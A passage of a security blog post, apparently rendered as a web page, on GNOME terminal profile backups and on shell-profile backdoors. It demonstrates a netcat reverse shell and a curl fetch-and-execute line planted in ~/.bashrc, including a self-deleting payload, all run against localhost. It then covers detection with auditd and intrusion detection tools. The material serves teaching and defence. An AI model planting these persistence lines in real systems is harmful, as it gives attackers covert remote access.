+palette=[&#39;rgb(23,20,33)&#39;, &#39;rgb(192,28,40)&#39;, &#39;rgb(38,162,105)&#39;, &#39;rgb(162,115,76)&#39;, &#39;rgb(18,72,139)&#39;, &#39;rgb(163,71,186)&#39;, &#39;rgb(42,161,179)&#39;, &#39;rgb(208,207,204)&#39;, &#39;rgb(94,92,100)&#39;, &#39;rgb(246,97,81)&#39;, &#39;rgb(51,209,122)&#39;, &#39;rgb(233,173,12)&#39;, &#39;rgb(42,123,222)&#39;, &#39;rgb(192,97,203)&#39;, &#39;rgb(51,199,222)&#39;, &#39;rgb(255,255,255)&#39;]
+use-theme-colors=false
+use-theme-transparency=false
+visible-name=&#39;My Custom Profile&#39;
+</code></pre></div>
+<p>This contains both the default profile, 'My Custom Profile', and includes the UUID's for both in the list variable so they'll appear in the settings UI for the GNOME terminal.</p>
+<p>To restore from a <code>dconf</code> backup file:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Note the path of /org/gnome/terminal/, this prepends the</span>
+<span class="c1"># legacy/profiles... bracketed paths in your backup.</span>
+dconf<span class="w"> </span>load<span class="w"> </span>/org/gnome/terminal/<span class="w"> </span>&lt;<span class="w"> </span>gnome-terminal-settings.dconf
+</code></pre></div>
+<div class="admonition tip">
+<p>If you don't see any immediate changes in your terminal window, try opening a new one.</p>
+</div>
+<hr />
+<h2 id="bashrc-security">bashrc Security</h2>
+<p>As always, when researching custom <code>.bashrc</code>, <code>.zshrc</code>, or other shell configurations, <em>be absolutely sure you've reviewed the code before dropping it into a system</em>. These files make great targets for reverse connections and code execution, as they function like shell scripts. Anything with write access to these files can backdoor them.</p>
+<p>Here are two practical examples you can try using localhost (these are not meant to harm your system, but it's always recommended to do things like this in a test environment such as a VM).</p>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<p>This uses <code>netcat</code> to simulate a reverse shell.</p>
+<p>On our "server" or the attacker's machine waiting to receive a connection:
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">1234</span><span class="w"> </span>-s<span class="w"> </span><span class="m">127</span>.0.1.1
+</code></pre></div></p>
+<p>On our "client", this line is added to the victim machine's .bashrc file:
+<div class="highlight"><pre><span></span><code>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/f<span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-nv<span class="w"> </span><span class="m">127</span>.0.1.1<span class="w"> </span><span class="m">1234</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/f
+</code></pre></div></p>
+<p>Running <code>source ~/.bashrc</code>, you'll notice the listener on the "attacker" side now has a shell on your system.</p>
+<h3 id="profile-backdoor">Profile Backdoor</h3>
+<p>To be more realistic we'll use a python webserver to host a payload and <code>curl</code> to download it to memory and execute it.</p>
+<p>We'll write a payload to delete itself silently after spawning <code>gnome-calculator</code>.</p>
+<p>First <code>cd</code> to <code>~/Public</code> and write the following text to a file named <code>test.sh</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+gnome-calculator<span class="p">&amp;</span>
+rm<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$0</span><span class="s2">&quot;</span>
+</code></pre></div>
+<p>Then start our webserver using python's built in http.server module:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">1234</span><span class="w"> </span>--bind<span class="w"> </span><span class="m">127</span>.0.1.1
+</code></pre></div>
+<p>Now on the "victim" side, add the following line to the bottom of your <code>~/.bashrc</code> file:</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>http://127.0.1.1:1234/test.sh<span class="w"> </span>&gt;<span class="w"> </span>/dev/shm/test.sh<span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>/dev/shm/test.sh<span class="p">;</span><span class="w"> </span>/dev/shm/test.sh
+</code></pre></div>
+<p>As soon as you <code>source ~/.bashrc</code> or open a new terminal tab / window, <code>gnome-calculator</code> will spawn. You'll also notice:</p>
+<ul>
+<li>No trace of <code>test.sh</code> in <code>/dev/shm/</code></li>
+<li>Aside from the obvious <code>gnome-calculator</code> window, the terminal window has full focus and did not print any errors or messages</li>
+<li><code>ps axjf</code> shows <code>gnome-calculator</code> spawned as though you ran it yourself, there's not process tree of <code>curl</code> &gt; <code>/bin/bash</code> &gt; <code>gnome-calculator</code></li>
+</ul>
+<h3 id="detecting-modification">Detecting Modification</h3>
+<p>Hopefully this illustrates how powerful shell profiles are. It wouldn't make sense to not provide suggestions on how to detect this.</p>
+<p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#shell-files">Relevant file paths</a>:</p>
+<ul>
+<li><code>/etc/profile</code></li>
+<li><code>/etc/profile.d/*</code></li>
+<li><code>/etc/bashrc</code></li>
+<li><code>/etc/bash_completion.d/*</code></li>
+<li><code>/etc/skel/*</code></li>
+<li><code>~/.bash*</code></li>
+<li><code>~/.profile</code></li>
+<li><code>~/.zshrc</code></li>
+<li><code>~/.zlogin</code></li>
+<li>and more</li>
+</ul>
+<p><strong>String Searching</strong></p>
+<p>Regularly reviewing the (writable) files for strings such as protocol connection strings like <code>://</code> or <code>\\\\</code> can point to malicious behavior, especially in files that were recently modified that shouldn't have been.</p>
+<p>Similarly, high-entropy or obviously encoded / obfuscated strings are indicators of suspicious activity. Conversely <a href="https://github.com/yoda66/PythonShellcodeRedux/blob/main/words_encode.py">low-entropy lists of words or plaintext referenced or put together by functions</a> is another techique to "hide in plain sight". These make it hard to see an obvious backdoor just by reading the source code, but the command will be built and executed. This will appear in logs if you're monitoring for it, assuming this technique is not also wiping logs.</p>
+<p><strong>auditd</strong></p>
+<p>Using <code>auditd</code> you can record and find this behavior. Like Sysmon, <a href="https://github.com/straysheep-dev/setup-auditd">you'll need to configure what it records</a>. If you're monitoring the use of <code>curl</code>:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>ausearch<span class="w"> </span>-ts<span class="w"> </span>recent<span class="w"> </span>-c<span class="w"> </span>curl
+</code></pre></div>
+<p>Will show every time <code>curl</code> was executed in the last 10 minutes. If you followed along with the example then in your logs you'll find:</p>
+<div class="highlight"><pre><span></span><code>type=EXECVE msg=audit(&lt;time&gt;:&lt;event-id&gt;): argc=3 a0=&quot;curl&quot; a1=&quot;-s&quot; a2=&quot;http://127.0.1.1:1234/test.sh&quot;
+</code></pre></div>
+<p>Which is a pretty good indicator and starting point for further investigation.</p>
+<p>You can do the same with the file <code>.bashrc</code> itself:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>ausearch<span class="w"> </span>-ts<span class="w"> </span>recent<span class="w"> </span>-f<span class="w"> </span>bashrc
+</code></pre></div>
+<p>This will show all entries related to files named <code>bashrc</code>. Here again, following the examples you may find <code>gedit</code> or <code>vi</code> was used to edit <code>~/.bashrc</code>.</p>
+<p><strong>Intrusion Detection</strong></p>
+<p>Lastly, an IDS like <code>aide</code>, <code>tripwire</code>, <code>samhain</code>, or an endpoint agent like <code>wazuh</code> can be configured to monitor these directories. If changes are ever reported to your <code>~/.bashrc</code> or shell profiles, be sure to review them.</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2023-2024 straysheep-dev
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/straysheep-dev" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../..", "features": ["navigation.instant", "navigation.tracking", "navigation.path", "navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.path", "navigation.top", "toc.integrate", "search.suggest", "search.highlight", "search.share", "content.tooltips"], "search": "../../../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+    
+  </body>
+</html>
